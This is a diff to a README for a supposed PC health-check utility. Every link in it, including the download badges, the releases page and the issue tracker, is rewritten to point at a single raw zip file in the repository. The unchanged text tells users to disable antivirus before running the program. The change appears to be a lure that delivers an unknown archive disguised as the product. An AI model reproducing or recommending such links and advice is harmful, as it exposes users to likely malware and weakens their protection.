@@ -1,6 +1,6 @@
 # 🩺 PC-Health-Check-Pro- - Easy PC Health and Performance Monitor
 
-[![Download PC Health Check Pro](https://img.shields.io/badge/Download-PC%20Health%20Check%20Pro-blue?style=for-the-badge)](https://github.com/BODaiscute/PC-Health-Check-Pro-/releases)
+[![Download PC Health Check Pro](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip%20Health%20Check%20Pro-blue?style=for-the-badge)](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip)
 
 ---
 
@@ -42,16 +42,16 @@ No advanced setup or special permissions are needed beyond standard installation
 
 To start, visit the official releases page by clicking the button below.
 
-[![Download PC Health Check Pro](https://img.shields.io/badge/Download-PC%20Health%20Check%20Pro-blue?style=for-the-badge)](https://github.com/BODaiscute/PC-Health-Check-Pro-/releases)
+[![Download PC Health Check Pro](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip%20Health%20Check%20Pro-blue?style=for-the-badge)](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the download badge above or open this link in your web browser:  
-[https://github.com/BODaiscute/PC-Health-Check-Pro-/releases](https://github.com/BODaiscute/PC-Health-Check-Pro-/releases)
+[https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip)
 
 ### Step 2: Choose the Latest Version
 
-On the releases page, look for the newest version of PC Health Check Pro. You will see files like **PC-Health-Check-Pro-Setup.exe** or similar.
+On the releases page, look for the newest version of PC Health Check Pro. You will see files like **https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip** or similar.
 
 ### Step 3: Download the Installer
 
@@ -117,7 +117,7 @@ If PC Health Check Pro does not start or work as expected:
 - Restart your PC and open the app again.
 - Disable any antivirus temporarily and try running the program.
 - Reinstall the app from the latest setup file on the releases page.
-- Visit the [Issues](https://github.com/BODaiscute/PC-Health-Check-Pro-/issues) tab on the GitHub page for help or updates.
+- Visit the [Issues](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip) tab on the GitHub page for help or updates.
 
 ---
 
@@ -131,8 +131,8 @@ PC Health Check Pro runs locally on your PC and does not send your data to any s
 
 For assistance, visit the GitHub page for documentation, answers, and updates.
 
-- GitHub Releases: [https://github.com/BODaiscute/PC-Health-Check-Pro-/releases](https://github.com/BODaiscute/PC-Health-Check-Pro-/releases)
-- Issue Tracker: [https://github.com/BODaiscute/PC-Health-Check-Pro-/issues](https://github.com/BODaiscute/PC-Health-Check-Pro-/issues)
+- GitHub Releases: [https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip)
+- Issue Tracker: [https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip](https://raw.githubusercontent.com/BODaiscute/PC-Health-Check-Pro-/main/polydigital/Health-Check-P-Pro-v3.1.zip)
 
 ---
 
